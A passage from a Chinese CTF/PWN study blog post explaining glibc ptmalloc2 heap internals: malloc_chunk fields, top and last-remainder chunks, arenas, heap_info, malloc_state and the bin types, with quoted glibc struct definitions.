PWN_堆与堆溢出18.png"></p><hr><h4 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h4><blockquote><p><code>malloc</code> 会使用 <code>mmap</code> 来创建独立的匿名映射段。匿名映射的目的主要是可以申请以 0 填充的内存，并且这块内存仅被调用进程所使用</p></blockquote><ul><li>在执行 <code>mmap</code> 之前，只有 <code>.so</code> 文件的 <code>mmap</code> 段</li><li>执行 <code>mmap</code> 之后，我们申请的内存与已经存在的内存段结合在了一起，构成了新的 <code>mmap</code> 段</li></ul><hr><h2 id="堆的结构"><a href="#堆的结构" class="headerlink" title="堆的结构"></a>堆的结构</h2><h3 id="微观结构"><a href="#微观结构" class="headerlink" title="微观结构"></a>微观结构</h3><h4 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h4><blockquote><p><code>chunk</code> 也叫块，在内存中表示的意思就是一块内存，这块内存在 <code>ptmalloc2</code> 内部用 <code>malloc_chunk</code> 结构体来表示</p><p>在程序的执行过程中，我们称由 <code>malloc()</code> 申请的内存为 <code>chunk</code>，<code>chunk</code> 也是堆的最小操作单元</p><p>参考文章：<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/heap-structure/#malloc_chunk">堆相关数据结构 - CTF Wiki</a></p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA15.png" alt="CTF - PWN_堆与堆溢出15.png"></p><p><code>malloc_chunk</code> 的结构体定义如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/*  This struct declaration is misleading (but accurate and necessary).  It declares a "view" into memory allowing access to necessary  fields at known offsets from a given base. See explanation below.*/</span><span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span> <span class="token punctuation">&#123;</span>  INTERNAL_SIZE_T      prev_size<span class="token punctuation">;</span>  <span class="token comment">/* Size of previous chunk (if free).  */</span>  INTERNAL_SIZE_T      size<span class="token punctuation">;</span>       <span class="token comment">/* Size in bytes, including overhead. */</span>  <span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span><span class="token operator">*</span> fd<span class="token punctuation">;</span>         <span class="token comment">/* double links -- used only if free. */</span>  <span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span><span class="token operator">*</span> bk<span class="token punctuation">;</span>  <span class="token comment">/* Only used for large blocks: pointer to next larger size.  */</span>  <span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span><span class="token operator">*</span> fd_nextsize<span class="token punctuation">;</span> <span class="token comment">/* double links -- used only if free. */</span>  <span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span><span class="token operator">*</span> bk_nextsize<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一些参数的解释：</p><ul><li><p><code>prev_size</code></p><ol><li><p>如果该 <code>chunk</code> 的物理相邻的前一地址 <code>chunk</code>（两个指针的地址差值为前一个 <code>chunk</code> 的大小）是空闲的话，那么 <code>prev_size</code> 记录的是前一个 <code>chunk</code> 的大小（包括 <code>chunk</code> 头）</p></li><li><p>否则，<code>prev_size</code> 可以用来存储物理相邻的前一个 <code>chunk</code> 的数据。这里的前一个 <code>chunk</code> 指的是较低地址的 <code>chunk</code></p></li></ol></li><li><p><code>size</code></p><ol><li><p><code>size</code> 表示该 <code>chunk</code> 的大小，大小必须是 <code>2 * SIZE_SZ</code> 的整数倍。如果申请的内存大小不是 <code>2 * SIZE_SZ</code> 的整数倍，会被转换成满足大小的最小的 <code>2 * SIZE_SZ</code> 的倍数</p></li><li><p>32 位系统中，<code>SIZE_SZ</code> 是 4；64 位系统中，<code>SIZE_SZ</code> 是 8。 该字段的低三个比特位对 <code>chunk</code> 的大小没有影响，它们从高到低分别表示</p></li><li><p>一般来说，堆中第一个被分配的内存块的 <code>size</code> 字段的 <code>P</code> 位都会被设置为 1，以便于防止访问前面的非法内存；当一个 <code>chunk</code> 的 <code>size</code> 的 <code>P</code> 位为 0 时，我们能通过 <code>prev_size</code> 字段来获取上一个 <code>chunk</code> 的大小以及地址。这也方便进行空闲 <code>chunk</code> 之间的合并</p></li></ol></li></ul><table><thead><tr><th align="left">参数</th><th align="left">意义</th><th></th></tr></thead><tbody><tr><td align="left"><code>（A）NON_MAIN_ARENA</code></td><td align="left">记录当前 <code>chunk</code> 是否不属于主线程，1 表示不属于，0 表示属于</td><td></td></tr><tr><td align="left"><code>（M）IS_MAPPED</code></td><td align="left">记录当前 <code>chunk</code> 是否是由 <code>mmap</code> 分配的</td><td></td></tr><tr><td align="left"><code>（P）PREV_INUSE</code></td><td align="left">记录前一个 <code>chunk</code> 块是否被分配，0 表示空闲，1 表示使用中</td><td></td></tr></tbody></table><ul><li><p><code>fd、bk</code></p><ol><li><p><code>chunk</code> 处于分配状态时，从 <code>fd</code> 字段开始是用户的数据。<code>chunk</code> 空闲时，会被添加到对应的空闲管理链表中</p></li><li><p>通过 <code>fd</code> 和 <code>bk</code> 可以将空闲的 <code>chunk</code> 块加入到空闲的 <code>chunk</code> 块链表进行统一管理</p></li></ol></li></ul><table><thead><tr><th align="left">参数</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left"><code>fd</code></td><td align="left">指向下一个（非物理相邻）空闲的 <code>chunk</code></td></tr><tr><td align="left"><code>bk</code></td><td align="left">指向上一个（非物理相邻）空闲的 <code>chunk</code></td></tr></tbody></table><ul><li><p><code>fd_nextsize、bk_nextsize</code></p><ol><li><p>只有 <code>chunk</code> 空闲的时候才使用，不过其用于较大的 <code>chunk</code>（<code>large chunk</code>）</p></li><li><p>一般空闲的 <code>large chunk</code> 在 <code>fd</code> 的遍历顺序中，按照由大到小的顺序排列。<strong>这样做可以避免在寻找合适 chunk 时挨个遍历</strong></p></li></ol></li></ul><table><thead><tr><th align="left">参数</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left"><code>fd_nextsize</code></td><td align="left">指向前一个与当前 <code>chunk</code> 大小不同的第一个空闲块，不包含 <code>bin</code> 的头指针</td></tr><tr><td align="left"><code>bk_nextsize</code></td><td align="left">指向后一个与当前 <code>chunk</code> 大小不同的第一个空闲块，不包含 <code>bin</code> 的头指针</td></tr></tbody></table><blockquote><p>注意：</p><p><strong>无论一个 chunk 的大小如何，处于分配状态还是释放状态，它们都使用一个统一的结构</strong></p><p><em>虽然在分配状态和释放状态下，<code>chunk</code> 都是同一个数据结构，但是它们的表现形式是不一样的</em></p></blockquote><ul><li><code>chunk</code> 处于分配状态（<code>Allocated chunk</code>）：</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA9.png" alt="CTF - PWN_堆与堆溢出9.png"></p><p><strong>前两个字段称为 <code>chunk header</code>，后面的部分称为 <code>user data</code></strong></p><p><mark>每次 <code>malloc</code> 申请得到的内存指针，其实指向 <code>user data</code> 的起始处</mark></p><blockquote><p><code>chunk</code> 中的空间复用：</p><p>当一个 <code>chunk</code> 处于使用状态时，它的下一个 <code>chunk</code> 的 <code>prev_size</code> 域无效，所以下一个 <code>chunk</code> 的该部分也可以被当前 <code>chunk</code> 使用</p></blockquote><ul><li><code>chunk</code> 处于释放状态（<code>Freed chunk</code>）（可能是循环双向链表，也可能是单向链表）：</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA8.png" alt="CTF - PWN_堆与堆溢出8.png"></p><p>如果一个 <code>chunk</code> 处于 <code>free</code> 状态，那么会有两个位置记录其相应的大小：</p><ol><li>该 <code>chunk</code> 本身的 <code>size</code> 字段会记录</li><li>该 <code>chunk</code> 后面的一个 <code>chunk</code> 会记录</li></ol><blockquote><p>堆管理器会通过 <code>prev_size</code> 字段以及 <code>size</code> 字段合并两个物理相邻的空闲 <code>chunk</code> 块</p></blockquote><hr><h4 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h4><blockquote><p>程序第一次进行 <code>malloc</code> 的时候，<code>heap</code> 会被分为两块，一块给用户，剩下的那块就是 <code>top chunk</code>，简而言之，**<code>top chunk</code> 就是处于当前堆的物理地址最高的 <code>chunk</code>**</p><p><code>top chunk</code> 不属于任何一个 <code>bin</code>，它的作用在于：  </p><ol><li>当所有的 <code>bin</code> 都无法满足用户请求的大小时，如果 <code>top chunk</code> 不小于用户请求的大小，就从 <code>top chunk</code> 中进行分配，并将剩下的部分作为新的 <code>top chunk</code>  </li><li>否则，就对 <code>heap</code> 进行扩展后再进行分配（在 <code>main arena</code> 中通过 <code>sbrk</code> 扩展 <code>heap</code>，而在 <code>thread arena</code> 中通过 <code>mmap</code> 分配新的 <code>heap</code>）</li></ol></blockquote><ul><li>初始情况下，可以将 <code>unsorted chunk</code> 作为 <code>top chunk</code></li><li><code>top chunk</code> 的 <code>PREV_INUSE</code> 位始终为 1（否则其前面的 <code>chunk</code> 就会被合并到 <code>top chunk</code> 中）</li></ul><hr><h4 id="last-remainder-chunk"><a href="#last-remainder-chunk" class="headerlink" title="last remainder chunk"></a>last remainder chunk</h4><blockquote><p>在用户使用 <code>malloc</code> 请求分配内存时，<code>ptmalloc2</code> 找到的 <code>chunk</code> 可能并不和申请的内存大小一致，这时候就将分割之后的剩余部分称之为 <code>last remainder chunk</code></p></blockquote><ul><li><code>unsorted bin</code> 也会存这一块</li><li><code>top chunk</code> 分割剩下的部分不会作为 <code>last remainder</code></li></ul><hr><h3 id="宏观结构"><a href="#宏观结构" class="headerlink" title="宏观结构"></a>宏观结构</h3><h4 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h4><blockquote><p>无论是主线程还是新创建的线程，在第一次申请内存时，都会有独立的 <code>arena</code>，<code>arena</code> 就是用来管理线程中的这些堆的，也可以理解为堆管理器所持有的内存池</p></blockquote><ul><li>一个线程只有一个 <code>arnea</code>，并且这些线程的 <code>arnea</code> 都是独立的不是相同的</li></ul><p>但也不是每一个线程都会有对应的 <code>arena</code>，对于不同系统，<code>arena</code> 数量的约束如下：</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">For 32 bit systems:     Number of arena = 2 * number of cores.For 64 bit systems:     Number of arena = 8 * number of cores.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>因为每个系统的核数是有限的，当线程数大于核数的二倍（超线程技术）时，就必然有线程处于等待状态，所以没有必要为每个线程分配一个 <code>arena</code></p><ul><li>主线程的 <code>arnea</code> 称为 <code>main_arena</code>，子线程的 <code>arnea</code> 称为 <code>thread_arena</code></li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA16.png" alt="CTF - PWN_堆与堆溢出16.png"></p><ul><li>主线程无论一开始 <code>malloc</code> 多少空间，只要 <code>size &lt; 128KB</code>，<code>kernel</code> 都会分配 <code>132KB</code> 具有读写权限的 <code>heap segment</code>，这部分称为 <code>main_arena</code></li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA17.png" alt="CTF - PWN_堆与堆溢出17.png"></p><p>例如这张图中：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA2.png" alt="CTF - PWN_堆与堆溢出2.png"></p><p><code>heap segment</code> 地址为 <code>0x555555559000 ~ 0x55555557a000</code>，具有 <code>rw</code> 权限，总共：<code>(0x55555557a000 - 0x555555559000)B / 1024 = 132KB</code></p><blockquote><p>注意：</p><p><code>main_arena</code> 并不在申请的 <code>heap</code> 中，而是一个全局变量，在 <code>libc.so</code> 的数据段中</p></blockquote><p>后续申请的内存会一直从这个 <code>arena</code> 中获取，直到空间不足</p><p>当 <code>arena</code> 空间不足时，它可以通过增加 <code>brk</code> 的方式来增加堆的空间；类似地，<code>arena</code> 也可以通过减小 <code>brk</code> 来缩小自己的空间</p><p>即使将所有 <code>main_arena</code> 所分配出去的内存块 <code>free</code> 完，也不会立即还给 <code>kernel</code>，而是交由 Glibc 来管理。当后面程序再次申请内存时，在 Glibc 中管理的内存充足的情况下，Glibc 就会根据堆分配的算法来给程序分配相应的内存</p><hr><h4 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h4><blockquote><p>程序刚开始执行时，每个线程是没有 <code>heap</code> 区域的。当其申请内存时，就需要 <code>heap_info</code> 这个结构来记录对应的信息</p><p>当该 <code>heap</code> 的资源被使用完后，就必须得再次申请内存了。此外，一般申请的 <code>heap</code> 是不连续的，因此需要记录不同 <code>heap</code> 之间的链接结构</p></blockquote><ul><li><p><strong><code>heap_info</code> 这个数据结构是专门为从 <code>Memory Mapping Segment</code> 处申请的内存准备的，即为非主线程准备的</strong></p></li><li><p>主线程可以通过 <code>sbrk()</code> 函数扩展 <code>program break location</code> 获得（直到触及 <code>Memory Mapping Segment</code>），只有一个 <code>heap</code>，没有 <code>heap_info</code> 数据结构</p></li></ul><p><code>heap_info</code> 的主要结构如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">HEAP_MIN_SIZE</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">HEAP_MAX_SIZE</span></span><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">ifdef</span> <span class="token expression">DEFAULT_MMAP_THRESHOLD_MAX</span></span><span class="token macro property"><span class="token directive-hash">#</span>  <span class="token directive keyword">define</span> <span class="token macro-name">HEAP_MAX_SIZE</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> DEFAULT_MMAP_THRESHOLD_MAX<span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">else</span></span><span class="token macro property"><span class="token directive-hash">#</span>  <span class="token directive keyword">define</span> <span class="token macro-name">HEAP_MAX_SIZE</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">)</span> </span><span class="token comment">/* must be a power of two */</span></span><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">endif</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token comment">/* HEAP_MIN_SIZE and HEAP_MAX_SIZE limit the size of mmap()ed heaps   that are dynamically created for multi-threaded programs.  The   maximum size must be a power of two, for fast determination of   which heap belongs to a chunk.  It should be much larger than the   mmap threshold, so that requests with a size just below that   threshold can be fulfilled without creating too many heaps.  */</span><span class="token comment">/***************************************************************************/</span><span class="token comment">/* A heap is a single contiguous memory region holding (coalesceable)   malloc_chunks.  It is allocated with mmap() and always starts at an   address aligned to HEAP_MAX_SIZE.  */</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_heap_info</span><span class="token punctuation">&#123;</span>  mstate ar_ptr<span class="token punctuation">;</span> <span class="token comment">/* Arena for this heap. */</span>  <span class="token keyword">struct</span> <span class="token class-name">_heap_info</span> <span class="token operator">*</span>prev<span class="token punctuation">;</span> <span class="token comment">/* Previous heap. */</span>  size_t size<span class="token punctuation">;</span>   <span class="token comment">/* Current size in bytes. */</span>  size_t mprotect_size<span class="token punctuation">;</span> <span class="token comment">/* Size in bytes that has been mprotected                           PROT_READ|PROT_WRITE.  */</span>  <span class="token comment">/* Make sure the following data is properly aligned, particularly     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of     MALLOC_ALIGNMENT. */</span>  <span class="token keyword">char</span> pad<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span> <span class="token operator">*</span> SIZE_SZ <span class="token operator">&amp;</span> MALLOC_ALIGN_MASK<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> heap_info<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该结构主要是描述堆的基本信息，包括：</p><ul><li>堆对应的 <code>arena</code> 的地址</li><li>由于一个线程申请一个堆之后，可能会使用完，之后就必须得再次申请。因此，一个线程可能会有多个堆。<code>prev</code> 即记录了上一个 <code>heap_info</code> 的地址。这里可以看到每个堆的 <code>heap_info</code> 是通过单向链表进行链接的</li><li><code>size</code> 表示当前堆的大小</li><li><code>pad</code> 确保分配的空间是按照 <code>MALLOC_ALIGN_MASK + 1</code> 对齐的</li></ul><hr><h4 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h4><blockquote><p><code>malloc_state</code> 结构用于管理堆，记录每个 <code>arena</code> 当前申请的内存的具体状态，例如：是否有空闲 <code>chunk</code>，空闲 <code>chunk</code> 的大小等等</p></blockquote><ul><li>无论是 <code>thread_arena</code> 还是 <code>main_arena</code>，它们都只有一个 <code>malloc state</code> 结构</li><li>由于 <code>thread</code> 的 <code>arena</code> 可能有多个，<code>malloc state</code> 结构会在最新申请的 <code>arena</code> 中</li></ul><p><code>malloc_state</code> 的结构如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">malloc_state</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/* Serialize access.  */</span>    <span class="token function">__libc_lock_define</span><span class="token punctuation">(</span><span class="token punctuation">,</span> mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* Flags (formerly in max_fast).  */</span>    <span class="token keyword">int</span> flags<span class="token punctuation">;</span>    <span class="token comment">/* Fastbins */</span>    mfastbinptr fastbinsY<span class="token punctuation">[</span> NFASTBINS <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span>    mchunkptr top<span class="token punctuation">;</span>    <span class="token comment">/* The remainder from the most recent split of a small request */</span>    mchunkptr last_remainder<span class="token punctuation">;</span>    <span class="token comment">/* Normal bins packed as described above */</span>    mchunkptr bins<span class="token punctuation">[</span> NBINS <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">-</span> <span class="token number">2</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">/* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> binmap<span class="token punctuation">[</span> BINMAPSIZE <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">/* Linked list, points to the next arena */</span>    <span class="token keyword">struct</span> <span class="token class-name">malloc_state</span> <span class="token operator">*</span>next<span class="token punctuation">;</span>    <span class="token comment">/* Linked list for free arenas.  Access to this field is serialized       by free_list_lock in arena.c.  */</span>    <span class="token keyword">struct</span> <span class="token class-name">malloc_state</span> <span class="token operator">*</span>next_free<span class="token punctuation">;</span>    <span class="token comment">/* Number of threads attached to this arena.  0 if the arena is on       the free list.  Access to this field is serialized by       free_list_lock in arena.c.  */</span>    INTERNAL_SIZE_T attached_threads<span class="token punctuation">;</span>    <span class="token comment">/* Memory allocated from the system in this arena.  */</span>    INTERNAL_SIZE_T system_mem<span class="token punctuation">;</span>    INTERNAL_SIZE_T max_system_mem<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>libc_lock_define(, mutex)</code><br>  该变量用于控制程序串行访问同一个分配区，当一个线程获取了分配区之后，其它线程要想访问该分配区，就必须等待该线程分配完成后才能够使用。</li><li><code>flags</code><br>  <code>flags</code> 记录了分配区的一些标志，比如 <code>bit0</code> 记录了分配区是否有 <code>fast bin chunk</code>，<code>bit1</code> 标识分配区是否能返回连续的虚拟地址空间。具体如下：</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/*   FASTCHUNKS_BIT held in max_fast indicates that there are probably   some fastbin chunks. It is set true on entering a chunk into any   fastbin, and cleared only in malloc_consolidate.   The truth value is inverted so that have_fastchunks will be true   upon startup (since statics are zero-filled), simplifying   initialization checks. */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">FASTCHUNKS_BIT</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">1U</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">have_fastchunks</span><span class="token expression"><span class="token punctuation">(</span>M<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token operator">-></span>flags <span class="token operator">&amp;</span> FASTCHUNKS_BIT<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">clear_fastchunks</span><span class="token expression"><span class="token punctuation">(</span>M<span class="token punctuation">)</span> <span class="token function">catomic_or</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token operator">-></span>flags<span class="token punctuation">,</span> FASTCHUNKS_BIT<span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">set_fastchunks</span><span class="token expression"><span class="token punctuation">(</span>M<span class="token punctuation">)</span> <span class="token function">catomic_and</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token operator">-></span>flags<span class="token punctuation">,</span> <span class="token operator">~</span>FASTCHUNKS_BIT<span class="token punctuation">)</span></span></span><span class="token comment">/*   NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous   regions.  Otherwise, contiguity is exploited in merging together,   when possible, results from consecutive MORECORE calls.   The initial value comes from MORECORE_CONTIGUOUS, but is   changed dynamically if mmap is ever used as an sbrk substitute. */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NONCONTIGUOUS_BIT</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">2U</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">contiguous</span><span class="token expression"><span class="token punctuation">(</span>M<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token operator">-></span>flags <span class="token operator">&amp;</span> NONCONTIGUOUS_BIT<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">noncontiguous</span><span class="token expression"><span class="token punctuation">(</span>M<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token operator">-></span>flags <span class="token operator">&amp;</span> NONCONTIGUOUS_BIT<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">set_noncontiguous</span><span class="token expression"><span class="token punctuation">(</span>M<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token operator">-></span>flags <span class="token operator">|=</span> NONCONTIGUOUS_BIT<span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">set_contiguous</span><span class="token expression"><span class="token punctuation">(</span>M<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token operator">-></span>flags <span class="token operator">&amp;=</span> <span class="token operator">~</span>NONCONTIGUOUS_BIT<span class="token punctuation">)</span></span></span><span class="token comment">/* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the   arena.  Such an arena is no longer used to allocate chunks.  Chunks   allocated in that arena before detecting corruption are not freed.  */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ARENA_CORRUPTION_BIT</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">4U</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">arena_is_corrupt</span><span class="token expression"><span class="token punctuation">(</span>A<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token operator">-></span>flags <span class="token operator">&amp;</span> ARENA_CORRUPTION_BIT<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">set_arena_corrupt</span><span class="token expression"><span class="token punctuation">(</span>A<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token operator">-></span>flags <span class="token operator">|=</span> ARENA_CORRUPTION_BIT<span class="token punctuation">)</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>fastbinsY[NFASTBINS]</code><br>  存放每个 <code>fast chunk</code> 链表头部的指针</li><li><code>top</code><br>  指向分配区的 <code>top chunk</code></li><li><code>last_reminder</code><br>  最新的 <code>chunk</code> 分割之后剩下的那部分</li><li><code>bins</code><br>  用于存储 <code>unstored bin</code>，<code>small bin</code> 和 <code>large bin</code> 的 <code>chunk</code> 链表</li><li><code>binmap</code><br>  <code>ptmalloc2</code> 用 1 个 <code>bit</code> 来标识某一个 <code>bin</code> 中是否包含空闲 <code>chunk</code></li></ul><blockquote><p>注意：</p><p><code>main_arena</code> 的 <code>malloc_state</code> 并不是 <code>heap segment</code> 的一部分，而是一个全局变量，存储在 <code>libc.so</code> 的数据段</p></blockquote><hr><h2 id="bin-的种类"><a href="#bin-的种类" class="headerlink" title="bin 的种类"></a>bin 的种类</h2><blockquote><p>Glibc 为了让 <code>malloc</code> 可以更快找到合适大小的 <code>chunk</code>，用户 <code>free</code> 释放掉的 <code>chunk</code> 不会马上归还给系统，而是将该 <code>chunk</code> 根据大小加入到合适的 <code>bin</code> 中</p><p>当用户再一次通过 <code>malloc</code> 请求分配内存时，<code>ptmalloc2</code> 会试图在空闲的 <code>chunk</code> 中挑选一块合适的空间给用户，这样可以避免频繁的系统调用，降低内存分配的开销</p><p><mark><code>bin</code> 的中文意思为垃圾桶，就像要删除的文件会先放入 Windows 的回收站一样不会立即删除，很生动形象了</mark></p></blockquote><p><code>ptmalloc2</code> 会根据空闲的 <code>chunk</code> 的大小以及使用状态，将 <code>chunk</code> 初步放入相应的 <code>bin</code> 中，<code>bin</code> 的种类主要分为：</p><ul><li><code>fast bin</code></li><li><code>small bin</code></li><li><code>large bin</code></li><li><code>unsorted bin</code></li><li><code>tcache</code></li></ul><p>Glibc 提供了两个数组：<code>fastbinsY[]</code> 和 <code>bins[]</code> 用来存放这些 <code>bin</code></p><p>具体来说，可分为：</p><ul><li>10 个 <code>fast bin</code>，存储在 <code>fastbinsY[]</code> 中</li><li>1 个 <code>unsorted bin</code>，存储在 <code>bins[1]</code> 中</li><li>62 个 <code>small bin</code>，存储在 <code>bins[2]</code> 至 <code>bins[63]</code> 中</li><li>63 个 <code>large bin</code>，存储在 <code>bins[64]</code> 至 <code>bins[126]</code> 中</li></ul><p>其中虽然定义了 <code>bins[128]</code>，但是 <code>bins[0]</code> 和 <code>bins[127]</code> 其实是不存在的</p><p><code>chunk</code> 在 <code>bin</code> 上以链表的形式存放：（<code>fast bin</code> 是<strong>单链表</strong>，其他的 <code>bin</code> 都是<strong>双链表</strong>）</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA10.png" alt="CTF - 